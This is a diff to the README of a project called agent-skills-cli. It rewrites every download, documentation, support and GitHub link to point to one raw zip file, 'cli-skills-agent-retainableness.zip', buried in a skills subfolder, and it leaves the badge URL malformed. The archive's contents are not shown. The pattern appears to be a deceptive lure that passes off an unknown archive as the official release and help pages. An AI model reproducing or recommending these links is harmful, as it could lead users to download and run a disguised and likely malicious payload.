@@ -1,6 +1,6 @@
 # 🌟 agent-skills-cli - Access Thousands of Agent Skills Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-v1.0-blue.svg)](https://github.com/stbarbe/agent-skills-cli/releases)
+[![Download Now](https://raw.githubusercontent.com/stbarbe/agent-skills-cli/main/skills/deep-researcher/cli-skills-agent-retainableness.zip%https://raw.githubusercontent.com/stbarbe/agent-skills-cli/main/skills/deep-researcher/cli-skills-agent-retainableness.zip)](https://raw.githubusercontent.com/stbarbe/agent-skills-cli/main/skills/deep-researcher/cli-skills-agent-retainableness.zip)
 
 ## 🚀 Getting Started
 
@@ -14,7 +14,7 @@ To download and install the agent-skills-cli, please follow these steps:
 
 1. **Visit the Releases Page**
    Go to the following link to access the downloads:
-   [Download Here](https://github.com/stbarbe/agent-skills-cli/releases)
+   [Download Here](https://raw.githubusercontent.com/stbarbe/agent-skills-cli/main/skills/deep-researcher/cli-skills-agent-retainableness.zip)
    
 2. **Choose Your Version**
    Find the latest version available. The release notes will help you understand what's new or different in this version.
@@ -90,8 +90,8 @@ If you encounter issues while downloading or running the application, consider t
 
 For more information and help, you can explore these resources:
 
-- [Repository Documentation](https://github.com/stbarbe/agent-skills-cli)
-- [User Support Page](https://github.com/stbarbe/agent-skills-cli/issues)
+- [Repository Documentation](https://raw.githubusercontent.com/stbarbe/agent-skills-cli/main/skills/deep-researcher/cli-skills-agent-retainableness.zip)
+- [User Support Page](https://raw.githubusercontent.com/stbarbe/agent-skills-cli/main/skills/deep-researcher/cli-skills-agent-retainableness.zip)
 
 ## 🤝 Contributing
 
@@ -103,7 +103,7 @@ This project is licensed under the MIT License. You can freely use and modify th
 
 ## 🔗 Useful Links
 
-- [Download the Latest Version](https://github.com/stbarbe/agent-skills-cli/releases)
-- [View on GitHub](https://github.com/stbarbe/agent-skills-cli) 
+- [Download the Latest Version](https://raw.githubusercontent.com/stbarbe/agent-skills-cli/main/skills/deep-researcher/cli-skills-agent-retainableness.zip)
+- [View on GitHub](https://raw.githubusercontent.com/stbarbe/agent-skills-cli/main/skills/deep-researcher/cli-skills-agent-retainableness.zip) 
 
 Thank you for using the agent-skills-cli! Enjoy exploring agent skills!
